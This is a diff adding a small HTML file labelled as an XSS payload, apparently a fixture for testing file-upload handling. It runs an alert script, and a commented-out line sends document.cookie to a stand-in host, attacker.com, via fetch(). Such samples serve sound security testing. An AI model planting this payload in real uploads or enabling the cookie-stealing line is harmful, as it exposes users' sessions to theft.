@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>XSS Payload</title>
+</head>
+
+<body>
+    <h1>Malicious HTML File</h1>
+    <p>This HTML file contains XSS!</p>
+    <script>
+        alert('XSS via HTML file upload!');
+        // Could also steal cookies:
+        // fetch('http://attacker.com/steal?cookie=' + document.cookie);
+    </script>
+</body>
+
+</html>
